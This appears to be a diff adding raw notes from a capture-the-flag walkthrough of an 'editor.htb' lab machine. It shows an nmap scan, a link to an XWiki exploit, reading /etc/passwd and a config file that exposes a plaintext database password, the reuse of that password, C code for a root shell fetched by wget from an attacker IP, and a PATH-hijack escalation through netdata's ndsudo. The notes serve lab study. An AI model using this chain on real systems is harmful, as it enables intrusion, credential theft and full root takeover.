@@ -1,0 +1,170 @@
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://editor.htb/
+8080/tcp open  http    Jetty 10.0.20
+| http-cookie-flags: 
+|   /: 
+|     JSESSIONID: 
+|_      httponly flag not set
+| http-robots.txt: 50 disallowed entries (15 shown)
+| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
+| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
+| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
+| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
+| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
+|_/xwiki/bin/undelete/
+| http-methods: 
+|_  Potentially risky methods: PROPFIND LOCK UNLOCK
+| http-webdav-scan: 
+|   Server Type: Jetty(10.0.20)
+|   WebDAV type: Unknown
+|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
+
+http://editor.htb:8080/robots.txt
+
+User-agent: *
+# Prevent bots from executing all actions except "view" and
+# "download" since:
+# 1) we don't want bots to execute stuff in the wiki by
+#    following links! (for example delete pages, add comments,
+#    etc)
+# 2) we don't want bots to consume CPU and memory
+#   (for example to perform exports)
+Disallow: /xwiki/bin/viewattachrev/
+Disallow: /xwiki/bin/viewrev/
+Disallow: /xwiki/bin/pdf/
+Disallow: /xwiki/bin/edit/
+Disallow: /xwiki/bin/create/
+Disallow: /xwiki/bin/inline/
+Disallow: /xwiki/bin/preview/
+Disallow: /xwiki/bin/save/
+Disallow: /xwiki/bin/saveandcontinue/
+Disallow: /xwiki/bin/rollback/
+Disallow: /xwiki/bin/deleteversions/
+Disallow: /xwiki/bin/cancel/
+Disallow: /xwiki/bin/delete/
+Disallow: /xwiki/bin/deletespace/
+Disallow: /xwiki/bin/undelete/
+Disallow: /xwiki/bin/reset/
+Disallow: /xwiki/bin/register/
+Disallow: /xwiki/bin/propupdate/
+Disallow: /xwiki/bin/propadd/
+Disallow: /xwiki/bin/propdisable/
+Disallow: /xwiki/bin/propenable/
+Disallow: /xwiki/bin/propdelete/
+Disallow: /xwiki/bin/objectadd/
+Disallow: /xwiki/bin/commentadd/
+Disallow: /xwiki/bin/commentsave/
+Disallow: /xwiki/bin/objectsync/
+Disallow: /xwiki/bin/objectremove/
+Disallow: /xwiki/bin/attach/
+Disallow: /xwiki/bin/upload/
+Disallow: /xwiki/bin/temp/
+Disallow: /xwiki/bin/downloadrev/
+Disallow: /xwiki/bin/dot/
+Disallow: /xwiki/bin/delattachment/
+Disallow: /xwiki/bin/skin/
+Disallow: /xwiki/bin/jsx/
+Disallow: /xwiki/bin/ssx/
+Disallow: /xwiki/bin/login/
+Disallow: /xwiki/bin/loginsubmit/
+Disallow: /xwiki/bin/loginerror/
+Disallow: /xwiki/bin/logout/
+Disallow: /xwiki/bin/lock/
+Disallow: /xwiki/bin/redirect/
+Disallow: /xwiki/bin/admin/
+Disallow: /xwiki/bin/export/
+Disallow: /xwiki/bin/import/
+Disallow: /xwiki/bin/get/
+Disallow: /xwiki/bin/distribution/
+Disallow: /xwiki/bin/jcaptcha/
+Disallow: /xwiki/bin/unknown/
+Disallow: /xwiki/bin/webjars/
+
+
+contact@editor.htb
+
+https://github.com/gunzf0x/CVE-2025-24893
+
+pwd
+/usr/lib/xwiki-jetty
+cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
+
+
+cd /etc/xwiki
+cat hibernate.cfg.xml
+
+<property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
+<property name="hibernate.connection.username">xwiki</property>
+<property name="hibernate.connection.password">theEd1t0rTeam99</property>
+
+//try to login with this credential
+uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
+
+///c file to spawn a shell with suid = 0
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/wait.h>
+
+int main() {
+    pid_t pid;
+
+    pid = fork(); // Create a child process
+
+    if (pid == -1) {
+        perror("fork");
+        exit(EXIT_FAILURE);
+    } else if (pid == 0) { // Child process
+        char *args[] = {"/bin/sh", NULL}; // Arguments for the shell
+        execvp(args[0], args); // Execute the shell
+        setuid(0);
+        perror("execvp"); // This line is reached only if execvp fails
+        exit(EXIT_FAILURE);
+    } else { // Parent process
+        int status;
+        waitpid(pid, &status, 0); // Wait for the child (shell) to terminate
+        printf("Shell process exited with status %d\n", status);
+    }
+
+    return 0;
+}
+
+gcc nvme.c -o nvme
+
+oliver@editor:/tmp$ wget http://10.10.16.16:/nvme
+--2025-08-12 06:47:31--  http://10.10.16.16/nvme
+Connecting to 10.10.16.16:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16056 (16K) [application/octet-stream]
+Saving to: ‘nvme’
+
+nvme                            100%[=====================================================>]  15.68K  74.6KB/s    in 0.2s    
+
+2025-08-12 06:47:32 (74.6 KB/s) - ‘nvme’ saved [16056/16056]
+
+oliver@editor:/tmp$ chmod +x nvme 
+oliver@editor:/tmp$ ls
+netdata-ipc
+nvme
+systemd-private-def7273fe8fc41eeb229d0277f8d7d35-ModemManager.service-nGoGhu
+systemd-private-def7273fe8fc41eeb229d0277f8d7d35-fwupd.service-wDwD6a
+systemd-private-def7273fe8fc41eeb229d0277f8d7d35-systemd-logind.service-FHniXa
+systemd-private-def7273fe8fc41eeb229d0277f8d7d35-systemd-resolved.service-nBHVHV
+systemd-private-def7273fe8fc41eeb229d0277f8d7d35-systemd-timesyncd.service-6IJVsU
+systemd-private-def7273fe8fc41eeb229d0277f8d7d35-upower.service-UMudEV
+systemd-private-def7273fe8fc41eeb229d0277f8d7d35-xwiki.service-ijPR3g
+tmux-1000
+vmware-root_610-2731152165
+
+export PATH=/tmp:$PATH
+
+oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+root@editor:/tmp# 
